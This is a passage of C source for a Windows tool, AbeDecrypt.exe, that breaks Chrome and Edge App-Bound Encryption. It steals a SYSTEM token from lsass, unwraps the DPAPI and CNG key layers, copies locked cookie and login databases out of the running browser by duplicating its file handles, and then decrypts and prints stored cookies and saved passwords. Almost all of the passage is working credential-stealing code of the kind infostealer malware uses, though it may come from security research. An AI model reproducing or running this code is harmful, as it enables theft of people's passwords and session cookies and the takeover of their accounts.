    if (i + 4 + ABE_KEY_SIZE * 2 > Total)
    {
        printf("L%-3lu: Drop: no key in child output\n", __LINE__);
        return FALSE;
    }
    Line = Buffer + i + 4;
    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        INT Hi = Line[i * 2] <= '9' ? Line[i * 2] - '0' : Line[i * 2] - 'A' + 10;
        INT Lo = Line[i * 2 + 1] <= '9' ? Line[i * 2 + 1] - '0' : Line[i * 2 + 1] - 'A' + 10;

        if (Hi < 0 || Hi > 15 || Lo < 0 || Lo > 15) return FALSE;
        Key[i] = (BYTE)((Hi << 4) | Lo);
    }
    return TRUE;
}

/*** AES-256-GCM open (no AAD) ***/

static BOOL
AbeAesGcmOpen(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(12) const BYTE* Nonce,
    _In_reads_bytes_(Length) const BYTE* CipherText,
    _In_ DWORD Length,
    _In_reads_bytes_(16) const BYTE* Tag,
    _Out_writes_bytes_(Length) PBYTE Plain)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Auth;
    BCRYPT_ALG_HANDLE Alg = NULL;
    BCRYPT_KEY_HANDLE Cipher = NULL;
    static BYTE Object[4096];
    ULONG ObjLen = 0, Done = 0, Result = 0;
    NTSTATUS St;

    St = BCryptOpenAlgorithmProvider(&Alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(St)) return FALSE;
    BCryptSetProperty(Alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    St = BCryptGetProperty(Alg, BCRYPT_OBJECT_LENGTH,
                           (PUCHAR)&ObjLen, sizeof(ObjLen), &Done, 0);
    if (!NT_SUCCESS(St) || ObjLen > sizeof(Object))
    {
        BCryptCloseAlgorithmProvider(Alg, 0);
        return FALSE;
    }
    St = BCryptGenerateSymmetricKey(Alg, &Cipher, Object, ObjLen,
                                    (PUCHAR)Key, 32, 0);
    if (NT_SUCCESS(St))
    {
        BCRYPT_INIT_AUTH_MODE_INFO(Auth);
        Auth.pbNonce = (PUCHAR)Nonce;
        Auth.cbNonce = 12;
        Auth.pbTag = (PUCHAR)Tag;
        Auth.cbTag = 16;
        St = BCryptDecrypt(Cipher, (PUCHAR)CipherText, Length,
                           &Auth, NULL, 0, Plain, Length, &Result, 0);
    }
    if (Cipher) BCryptDestroyKey(Cipher);
    BCryptCloseAlgorithmProvider(Alg, 0);
    return NT_SUCCESS(St);
}

/* v10/v11/v20 column values: "vXX" + nonce[12] + ciphertext + tag[16] */
static BOOL
AbeGcmDecrypt(
    _In_reads_bytes_(32) const BYTE* Key,
    _In_reads_bytes_(Length) const BYTE* Value,
    _In_ DWORD Length,
    _Out_writes_bytes_(Length) PBYTE Plain)
{
    if (Length <= 3 + 12 + 16) return FALSE;
    return AbeAesGcmOpen(Key, Value + 3, Value + 15, Length - 3 - 12 - 16,
                         Value + Length - 16, Plain);
}

/*** method: Elevate (admin: SYSTEM + user DPAPI layers, then V3 envelope) ***/

/* V3 envelope unwrap; must run impersonating SYSTEM (the CNG key lives in the
   SYSTEM profile's Microsoft Software KSP store) */
static BOOL
AbeV3Unwrap(
    _In_ const ABE_BROWSER* Browser,
    _In_reads_bytes_(ABE_V3_ENVELOPE_SIZE) const BYTE* Envelope,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    NCRYPT_PROV_HANDLE Provider = 0;
    NCRYPT_KEY_HANDLE CngKey = 0;
    WCHAR AlgGroup[64];
    BYTE Derived[ABE_KEY_SIZE];
    DWORD Length = 0;
    SECURITY_STATUS St;
    BOOL Ok;
    ULONG i;

    St = NCryptOpenStorageProvider(&Provider, MS_KEY_STORAGE_PROVIDER, 0);
    if (FAILED(St))
    {
        printf("L%-3lu: V3: NCryptOpenStorageProvider failed, 0x%08lX\n",
                        __LINE__, (unsigned long)St);
        return FALSE;
    }
    St = NCryptOpenKey(Provider, &CngKey, Browser->CngKey, 0, 0);
    if (FAILED(St))
    {
        printf("L%-3lu: V3: NCryptOpenKey(%ls) failed, 0x%08lX\n",
                        __LINE__, Browser->CngKey, (unsigned long)St);
        NCryptFreeObject(Provider);
        return FALSE;
    }
    if (NCryptGetProperty(CngKey, NCRYPT_ALGORITHM_GROUP_PROPERTY,
                          (PBYTE)AlgGroup, sizeof(AlgGroup), &Length, 0) == ERROR_SUCCESS)
    {
        printf("V3: CNG key algorithm group: %ls\n", AlgGroup);
    }

    /* raw 32->32 decrypt, as done by the browsers' elevation service and ChatGPT's importer */
    St = NCryptDecrypt(CngKey, (PBYTE)Envelope + 1, ABE_KEY_SIZE, NULL,
                       Derived, sizeof(Derived), &Length, NCRYPT_SILENT_FLAG);
    NCryptFreeObject(CngKey);
    NCryptFreeObject(Provider);
    if (FAILED(St) || Length != ABE_KEY_SIZE)
    {
        printf("L%-3lu: V3: NCryptDecrypt failed, 0x%08lX (len=%lu)\n",
                        __LINE__, (unsigned long)St, Length);
        return FALSE;
    }

    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        Derived[i] ^= AbeV3Mask[i];
    }
    /* Envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
    Ok = AbeAesGcmOpen(Derived, Envelope + 33, Envelope + 45, ABE_KEY_SIZE,
                       Envelope + 77, Key);
    RtlSecureZeroMemory(Derived, sizeof(Derived));
    if (!Ok)
    {
        printf("L%-3lu: V3: AES-256-GCM open failed (bad tag?)\n", __LINE__);
    }
    return Ok;
}

static BOOL
AbeGetKeyElevate(
    _In_ const ABE_BROWSER* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    static BYTE Blob[4096];
    DATA_BLOB In, Out = { 0 };
    DWORD BlobLength = sizeof(Blob);
    ULONG LsaProcessId;
    HANDLE SystemToken = NULL;
    NTSTATUS Status;
    BOOL Ok = FALSE;

    if (!AbeReadAppbBlob(Browser, Blob, sizeof(Blob), &BlobLength)) return FALSE;

    /* duplicate the SYSTEM impersonation token from lsass (admin needed) */
    Status = Sys_GetLsaProcessId(&LsaProcessId);
    if (NT_SUCCESS(Status))
    {
        Status = PS_DuplicateSystemToken(LsaProcessId, TokenImpersonation, &SystemToken);
    }
    if (!NT_SUCCESS(Status))
    {
        printf("L%-3lu: Elevate: cannot obtain SYSTEM token, 0x%08lX (admin needed)\n",
                        __LINE__, Status);
        return FALSE;
    }

    /* layer 1: SYSTEM DPAPI */
    In.pbData = Blob + 4;
    In.cbData = BlobLength - 4;
    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
    {
        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out))
        {
            PS_Impersonate(NULL);
            NtClose(SystemToken);
            printf("L%-3lu: Elevate: SYSTEM DPAPI failed, gle=%lu\n", __LINE__, GetLastError());
            return FALSE;
        }
        PS_Impersonate(NULL);
    }
    else
    {
        NtClose(SystemToken);
        printf("L%-3lu: Elevate: impersonation failed, 0x%08lX\n", __LINE__, Status);
        return FALSE;
    }

    /* layer 2: user DPAPI, then unwrap the innermost structure */
    {
        DATA_BLOB Final = { 0 };
        DWORD ValidationLength, PayloadLength;
        const BYTE* Payload;
        BOOL Parsed = FALSE;

        In.pbData = Out.pbData;
        In.cbData = Out.cbData;
        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Final))
        {
            LocalFree(Out.pbData);
            NtClose(SystemToken);
            printf("L%-3lu: Elevate: user DPAPI failed, gle=%lu\n", __LINE__, GetLastError());
            return FALSE;
        }
        LocalFree(Out.pbData);

        /* innermost: [u32 len][validation data][u32 len][payload]
           (Edge payload: raw key; Chrome V3: private envelope) */
        if (Final.cbData >= 8)
        {
            RtlCopyMemory(&ValidationLength, Final.pbData, sizeof(ValidationLength));
            RtlCopyMemory(&PayloadLength, Final.pbData + 4 + ValidationLength,
                          sizeof(PayloadLength));
            Payload = Final.pbData + 8 + ValidationLength;
            if ((ULONGLONG)(Payload - Final.pbData) + PayloadLength == Final.cbData)
            {
                Parsed = TRUE;
                printf("Elevate: innermost %lu bytes: validation=%lu payload=%lu version=%u\n",
                                Final.cbData, ValidationLength, PayloadLength,
                                PayloadLength != 0 ? Payload[0] : 0);

                if (PayloadLength == ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
                {
                    /* V3: the CNG unwrap must run as SYSTEM */
                    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
                    {
                        Ok = AbeV3Unwrap(Browser, Payload, Key);
                        PS_Impersonate(NULL);
                    }
                }
                else if (PayloadLength == ABE_KEY_SIZE)
                {
                    RtlCopyMemory(Key, Payload, ABE_KEY_SIZE);
                    Ok = TRUE;
                }
                else
                {
                    printf("L%-3lu: Elevate: unsupported payload (%lu bytes)\n",
                                    __LINE__, PayloadLength);
                }
            }
        }
        if (!Parsed)
        {
            printf("L%-3lu: Elevate: malformed innermost blob (%lu bytes)\n",
                            __LINE__, Final.cbData);
        }
        RtlSecureZeroMemory(Final.pbData, Final.cbData);
        LocalFree(Final.pbData);
    }
    NtClose(SystemToken);
    return Ok;
}

/*** v10 key (DPAPI, always works) ***/

static BOOL
AbeGetV10Key(
    _In_ const ABE_BROWSER* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    WCHAR UserData[MAX_PATH], Exe[MAX_PATH], LocalState[MAX_PATH];
    static BYTE Blob[2048];
    PVOID Text;
    ULONG TextLength;
    PCSTR Base64;
    DWORD Base64Length, BlobLength = sizeof(Blob);
    DATA_BLOB In, Out = { 0 };
    BOOL Ok = FALSE;

    if (!AbeGetPaths(Browser, Exe, UserData)) return FALSE;
    StrSafe_CchPrintfW(LocalState, MAX_PATH, L"%s\\Local State", UserData);
    if (!NT_SUCCESS(AbeReadWholeFile(LocalState, &Text, &TextLength))) return FALSE;
    if (AbeFindJsonTag(Text, TextLength, "\"encrypted_key\":\"", &Base64, &Base64Length) &&
        CryptStringToBinaryA(Base64, Base64Length, CRYPT_STRING_BASE64,
                             Blob, &BlobLength, NULL, NULL) &&
        BlobLength > 5 && memcmp(Blob, "DPAPI", 5) == 0)
    {
        In.pbData = Blob + 5;
        In.cbData = BlobLength - 5;
        Ok = CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out) &&
             Out.cbData == ABE_KEY_SIZE;
        if (Ok)
        {
            RtlCopyMemory(Key, Out.pbData, ABE_KEY_SIZE);
            RtlSecureZeroMemory(Out.pbData, Out.cbData);
        }
        LocalFree(Out.pbData);
    }
    Mem_Free(Text);
    return Ok;
}

/*** SQLite ***/

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int (*SQLITE_OPEN)(const char*, sqlite3**, int, const char*);
typedef int (*SQLITE_CLOSE)(sqlite3*);
typedef int (*SQLITE_PREPARE)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int (*SQLITE_STEP)(sqlite3_stmt*);
typedef int (*SQLITE_FINALIZE)(sqlite3_stmt*);
typedef const unsigned char* (*SQLITE_COL_TEXT)(sqlite3_stmt*, int);
typedef const void* (*SQLITE_COL_BLOB)(sqlite3_stmt*, int);
typedef int (*SQLITE_COL_BYTES)(sqlite3_stmt*, int);
typedef int (*SQLITE_DESERIALIZE)(sqlite3*, const char*, unsigned char*,
                                  sqlite3_int64, sqlite3_int64, unsigned);

static struct
{
    HMODULE Mod;
    SQLITE_OPEN Open;
    SQLITE_CLOSE Close;
    SQLITE_PREPARE Prepare;
    SQLITE_STEP Step;
    SQLITE_FINALIZE Finalize;
    SQLITE_COL_TEXT ColText;
    SQLITE_COL_BLOB ColBlob;
    SQLITE_COL_BYTES ColBytes;
    SQLITE_DESERIALIZE Deserialize;
} Sq;

static BOOL
AbeLoadSqlite(VOID)
{
    Sq.Mod = LoadLibraryExW(L"winsqlite3.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    if (Sq.Mod == NULL) return FALSE;
    Sq.Open = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_open_v2");
    Sq.Close = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_close");
    Sq.Prepare = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_prepare_v2");
    Sq.Step = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_step");
    Sq.Finalize = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_finalize");
    Sq.ColText = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_column_text");
    Sq.ColBlob = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_column_blob");
    Sq.ColBytes = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_column_bytes");
    Sq.Deserialize = (PVOID)GetProcAddress(Sq.Mod, "sqlite3_deserialize");
    return Sq.Open && Sq.Close && Sq.Prepare && Sq.Step && Sq.Finalize &&
           Sq.ColText && Sq.ColBlob && Sq.ColBytes;
}

static PCSTR
AbePathToUri(
    _In_ PCWSTR Path,
    _In_ BOOL Immutable)
{
    static CHAR Uri[MAX_PATH * 3];
    CHAR Utf8[MAX_PATH * 3];
    DWORD Bytes, i;
    PSTR Out;

    Bytes = WideCharToMultiByte(CP_UTF8, 0, Path, -1, Utf8, sizeof(Utf8), NULL, NULL);
    if (Bytes == 0) return NULL;
    Out = Uri;
    StrSafe_CchPrintfA(Uri, sizeof(Uri), "file:");
    Out = Uri + strlen(Uri);
    for (i = 0; i < Bytes - 1; i++)
    {
        *Out++ = Utf8[i] == '\\' ? '/' : Utf8[i];
    }
    *Out = 0;
    StrSafe_CchPrintfA(Out, sizeof(Uri) - (DWORD)(Out - Uri),
                       Immutable ? "?immutable=1" : "?mode=ro");
    return Uri;
}

/*** locked database: map the browser's own handle via FileProcessIdsUsingFileInformation ***/

static BOOL
AbeReadLockedDb(
    _In_ PCWSTR DbPath,
    _Outptr_result_bytebuffer_(*Size) PBYTE* Buffer,
    _Out_ PULONG Size)
{
    PFILE_PROCESS_IDS_USING_FILE_INFORMATION Owners = NULL;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION Handles = NULL;
    FILE_NAME_INFORMATION* OwnName = NULL;
    IO_STATUS_BLOCK IoStatusBlock;
    HANDLE File = NULL, Process = NULL, Dup = NULL;
    ULONGLONG FileSize;
    IO_FILE_MAP Map;
    ULONG Length, Required, i, j;
    NTSTATUS Status;
    BOOL Ok = FALSE;

    *Buffer = NULL;
    *Size = 0;

    /* an attributes-only open succeeds even while the browser holds the DB busy */
    Status = IO_OpenWin32File(&File, DbPath, NULL, FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (!NT_SUCCESS(Status))
    {
        printf("L%-3lu: locked read: open failed, 0x%08lX\n", __LINE__, Status);
        return FALSE;
    }

    /* our own volume-relative name, used to match the browser's handles */
    OwnName = Mem_Alloc(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR));
    if (OwnName == NULL) goto Cleanup;
    Status = NtQueryInformationFile(File, &IoStatusBlock, OwnName,
                                    (ULONG)(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR)),
                                    FileNameInformation);
    if (!NT_SUCCESS(Status)) goto Cleanup;

    /* who is holding this file? */
    Length = FIELD_OFFSET(FILE_PROCESS_IDS_USING_FILE_INFORMATION, ProcessIdList) +
             16 * sizeof(HANDLE);
    for (;;)
    {
        Owners = Mem_ReAlloc(Owners, Length);
        if (Owners == NULL) goto Cleanup;
        Status = NtQueryInformationFile(File, &IoStatusBlock, Owners, Length,
                                        FileProcessIdsUsingFileInformation);
        if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
            Status != STATUS_BUFFER_TOO_SMALL)
        {
            break;
        }
        Length *= 2;
        if (Length > 1 << 20) goto Cleanup;
    }
    if (!NT_SUCCESS(Status)) goto Cleanup;

    /* duplicate a matching handle from each owner (no system-wide enumeration) */
    for (i = 0; i < Owners->NumberOfProcessIdsInList && !Ok; i++)
    {
        if (!NT_SUCCESS(PS_OpenProcess(&Process, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                                       (ULONG)(ULONG_PTR)Owners->ProcessIdList[i])))
        {
            continue;
        }
        Length = 64 * 1024;
        Handles = NULL;
        for (;;)
        {
            Handles = Mem_ReAlloc(Handles, Length);
            if (Handles == NULL) break;
            Status = NtQueryInformationProcess(Process, ProcessHandleInformation,
                                               Handles, Length, &Required);
            if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
                Status != STATUS_BUFFER_TOO_SMALL)
            {
                break;
            }
            Length = max(Length * 2, Required + 4096);
            if (Length > 64 * 1024 * 1024) break;
        }
        if (Handles == NULL || !NT_SUCCESS(Status))
        {
            Mem_Free(Handles);
            Handles = NULL;
            NtClose(Process);
            Process = NULL;
            continue;
        }

        for (j = 0; j < Handles->NumberOfHandles && !Ok; j++)
        {
            FILE_NAME_INFORMATION* Name;

            if (!NT_SUCCESS(NtDuplicateObject(Process,
                                              Handles->Handles[j].HandleValue,
                                              NtCurrentProcess(),
                                              &Dup, 0, 0, DUPLICATE_SAME_ACCESS)))
            {
                continue;
            }
            /* non-file handles fail this query instantly (no hang) */
            Name = Mem_Alloc(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR));
            if (Name != NULL &&
                NT_SUCCESS(NtQueryInformationFile(Dup, &IoStatusBlock, Name,
                                                  (ULONG)(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR)),
                                                  FileNameInformation)) &&
                Name->FileNameLength == OwnName->FileNameLength)
            {
                UNICODE_STRING A, B;

                A.Length = A.MaximumLength = (USHORT)OwnName->FileNameLength;
                A.Buffer = OwnName->FileName;
                B.Length = B.MaximumLength = (USHORT)Name->FileNameLength;
                B.Buffer = Name->FileName;
                if (RtlEqualUnicodeString(&A, &B, TRUE) &&
                    NT_SUCCESS(IO_GetFileSize(Dup, &FileSize)) &&
                    FileSize > 0 && FileSize < 64 * 1024 * 1024 &&
                    NT_SUCCESS(IO_MapReadOnlyFile(Dup, &Map)))
                {
                    *Buffer = Mem_Alloc((SIZE_T)FileSize);
                    if (*Buffer != NULL)
                    {
                        RtlCopyMemory(*Buffer, Map.BaseAddress, (SIZE_T)FileSize);
                        *Size = (ULONG)FileSize;
                        Ok = TRUE;
                    }
                    IO_UnmapFile(&Map);
                }
            }
            Mem_Free(Name);
            NtClose(Dup);
            Dup = NULL;
        }
        Mem_Free(Handles);
        Handles = NULL;
        NtClose(Process);
        Process = NULL;
    }

Cleanup:
    if (Dup != NULL) NtClose(Dup);
    if (Process != NULL) NtClose(Process);
    Mem_Free(Handles);
    Mem_Free(Owners);
    Mem_Free(OwnName);
    NtClose(File);
    return Ok;
}

/*** dump records ***/

static VOID
AbeDumpRecords(
    _In_ const ABE_BROWSER* Browser,
    _In_z_ PCWSTR Profile,
    _In_ BOOL IsCookie,
    _In_reads_bytes_(32) const BYTE* V10Key,
    _In_reads_bytes_opt_(32) const BYTE* V20Key)
{
    static const CHAR CookieSql[] =
        "SELECT host_key,name,encrypted_value FROM cookies LIMIT 10";
    static const CHAR PasswordSql[] =
        "SELECT origin_url,username_value,password_value FROM logins LIMIT 10";
    WCHAR Base[MAX_PATH], DbPath[MAX_PATH];
    sqlite3* Db = NULL;
    sqlite3_stmt* St = NULL;
    static BYTE Plain[4096];
    const BYTE* Blob;
    const char *Site, *Name;
    DWORD Length, Skip;
    int Result;

    GetEnvironmentVariableW(L"LOCALAPPDATA", Base, MAX_PATH);
    StrSafe_CchPrintfW(DbPath, MAX_PATH, L"%s\\%s\\User Data\\%s\\%hs",
                       Base, Browser->Vendor, Profile,
                       IsCookie ? "Network\\Cookies" : "Login Data");

    /* try: mode=ro → immutable → DuplicateHandle + deserialize (locked fallback) */
    {
        Result = Sq.Open(AbePathToUri(DbPath, FALSE), &Db, 0x41, NULL);
        if (Result != 0)
        {
            if (Db) Sq.Close(Db);
            Result = Sq.Open(AbePathToUri(DbPath, TRUE), &Db, 0x41, NULL);
        }
        if (Result != 0 && Sq.Deserialize != NULL)
        {
            PBYTE RawDb = NULL;
            ULONG RawSize = 0;

            if (Db) Sq.Close(Db);
            Db = NULL;
            if (AbeReadLockedDb(DbPath, &RawDb, &RawSize))
            {
                Result = Sq.Open(":memory:", &Db, 0x02 | 0x04, NULL);
                if (Result == 0)
                {
                    Result = Sq.Deserialize(Db, "main", RawDb,
                                            (sqlite3_int64)RawSize,
                                            (sqlite3_int64)RawSize,
                                            0x01 /* READONLY */);
                    if (Result != 0)
                    {
                        Sq.Close(Db);
                        Db = NULL;
                    }
                }
            }
        }
    }
    if (Result != 0 || Sq.Prepare(Db, IsCookie ? CookieSql : PasswordSql,
                                  -1, &St, NULL) != 0)
    {
        printf("    (database unavailable: %d)\n", Result);
        if (Db) Sq.Close(Db);
        return;
    }

    while (Sq.Step(St) == 100 /* SQLITE_ROW */)
    {
        PCSTR Ver;
        const BYTE* Key = NULL;

        Site = (const char*)Sq.ColText(St, 0);
        Name = (const char*)Sq.ColText(St, 1);
        Blob = (const BYTE*)Sq.ColBlob(St, 2);
        Length = (DWORD)Sq.ColBytes(St, 2);
        if (!Site || !Name || !Blob || Length <= 31) continue;

        /* determine version prefix and pick the key */
        Ver = memcmp(Blob, "v20", 3) == 0 ? "v20" :
              memcmp(Blob, "v10", 3) == 0 ? "v10" :
              memcmp(Blob, "v11", 3) == 0 ? "v11" : "???";

        if (memcmp(Blob, "v20", 3) == 0 && V20Key) Key = V20Key;
        else if ((memcmp(Blob, "v10", 3) == 0 || memcmp(Blob, "v11", 3) == 0) && V10Key) Key = V10Key;
        if (!Key || !AbeGcmDecrypt(Key, Blob, Length, Plain)) continue;
        Skip = IsCookie && Length > 3 + 12 + 16 + 32 ? 32 : 0;

        printf("[%hs] %hs  %hs  %.*hs\n",
                        Ver, Site, Name,
                        (int)(Length - 31 - Skip > 0 ? Length - 31 - Skip : 0),
                        (const char*)Plain + Skip);
    }
    Sq.Finalize(St);
    Sq.Close(Db);
}

/*** key printing: bright yellow + warning markers, so screenshots don't leak it unredacted ***/

static BOOL AbeVtOk; /* VT sequences active (real console only, not pipes/files) */

/* prints a key in bright yellow with warning markers (screenshot reminder) */
static VOID
AbePrintKey(
    _In_z_ PCSTR Label,
    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key)
{
    ULONG i;

    if (AbeVtOk) printf("\x1b[1;33m");
    printf("!!! %hs: ", Label);
    for (i = 0; i < ABE_KEY_SIZE; i++)
    {
        printf("%02X", Key[i]);
    }
    printf(" !!!\n");
    if (AbeVtOk) printf("\x1b[0m");
}

/*** entry ***/

int
_cdecl
wmain(VOID)
{
    const ABE_BROWSER* Browser = AbeParseBrowser();

    ABE_METHOD Method = AbeParseMethod();
    static const PCWSTR MethodNames[] = { L"Drop", L"Inject", L"Hijack", L"Elevate" };
    BYTE V10Key[ABE_KEY_SIZE], V20Key[ABE_KEY_SIZE];
    BOOL HaveV10, HaveV20 = FALSE;
    ULONG BrowserIndex;

    if (Browser == NULL)
    {
        printf("usage: AbeDecrypt.exe <Chrome|Edge> <Drop|Inject|Hijack|Elevate> [-Profile=\"Profile Name\"]\n");
        return EXIT_FAILURE;
    }
    AbeParseProfile();
    BrowserIndex = (ULONG)(Browser - Browsers);

    /* enable ANSI on a real console; when redirected we fall back to plain text */
    {
        HANDLE Out = GetStdHandle(STD_OUTPUT_HANDLE);
        DWORD Mode;

        AbeVtOk = GetConsoleMode(Out, &Mode) &&
                  SetConsoleMode(Out, Mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
    }

    printf("Browser: %ls  Method: %ls  Profile: %ls\n",
                    Browser->Name, MethodNames[Method], g_Profile);

    /* v10 key: DPAPI, no special method needed */
    HaveV10 = AbeGetV10Key(Browser, V10Key);
    printf("v10 key (DPAPI): %ls\n", HaveV10 ? L"OK" : L"FAILED");
    if (HaveV10) AbePrintKey("V10 KEY (DPAPI)", V10Key);

    /* v20 key: via the selected method */
    switch (Method)
    {
        case MethodDrop:
            HaveV20 = AbeGetKeyDrop(Browser, BrowserIndex, V20Key);
            break;
        case MethodInject:
            HaveV20 = AbeGetKeyInject(Browser, BrowserIndex, V20Key);
            break;
        case MethodElevate:
            HaveV20 = AbeGetKeyElevate(Browser, V20Key);
            break;
        default:
            HaveV20 = AbeGetKeyHijack(Browser, BrowserIndex, V20Key);
            break;
    }
    printf("v20 key (%ls): %ls\n", MethodNames[Method],
                    HaveV20 ? L"OK" : L"FAILED (v20 records will be skipped)");
    if (HaveV20) AbePrintKey("V20 KEY", V20Key);
    printf("\n");

    if (!HaveV10 && !HaveV20)
    {
        printf("no keys available, aborting\n");
        return EXIT_FAILURE;
    }
    if (!AbeLoadSqlite())
    {
        printf("winsqlite3.dll unavailable\n");
        return EXIT_FAILURE;
    }

    printf("--- Cookies: [version] site | name | value ---\n");
    AbeDumpRecords(Browser, g_Profile, TRUE, HaveV10 ? V10Key : NULL, HaveV20 ? V20Key : NULL);
    printf("\n--- Passwords: [version] site | username | password ---\n");
    AbeDumpRecords(Browser, g_Profile, FALSE, HaveV10 ? V10Key : NULL, HaveV20 ? V20Key : NULL);

    RtlSecureZeroMemory(V10Key, sizeof(V10Key));
    if (HaveV20) RtlSecureZeroMemory(V20Key, sizeof(V20Key));
    return EXIT_SUCCESS;
}
